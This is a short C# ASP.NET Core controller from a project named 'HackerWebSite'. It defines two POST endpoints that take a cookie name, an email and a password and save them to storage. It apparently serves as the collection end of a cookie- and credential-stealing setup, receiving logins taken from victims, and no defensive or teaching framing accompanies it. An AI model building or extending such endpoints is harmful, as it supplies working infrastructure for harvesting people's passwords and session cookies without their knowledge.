using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using HackerWebSite.DAL;
using HackerWebSite.Data;
using Microsoft.AspNetCore.Mvc;

// For more information on enabling Web API for empty projects, visit https://go.microsoft.com/fwlink/?LinkID=397860

namespace HackerWebSite
{
    [Route("/Cookie")]
    public class CookiesController : Controller
    {
        [HttpPost]
        [Route("SaveCookies")]
        public void SaveCookies(string CookieName, string email, string password)
        {
            CookiesDTO loginDTO = new CookiesDTO() { CookieName = CookieName, Email = email, Password = password };
            LoginDAL loginDAL = new LoginDAL();
            loginDAL.SaveCookies(loginDTO);
        }

        [HttpPost]
        [Route("SaveCookies1")]
        public void SaveCookies(string cookieList)
        {
            string[] cookieArray = cookieList.Split(";");
            CookiesDTO loginDTO = new CookiesDTO() { 
                CookieName = cookieArray[0], 
                Email = cookieArray[1],
                Password = cookieArray[2]
            };
            LoginDAL loginDAL = new LoginDAL();
            loginDAL.SaveCookies(loginDTO);
        }
    }
}
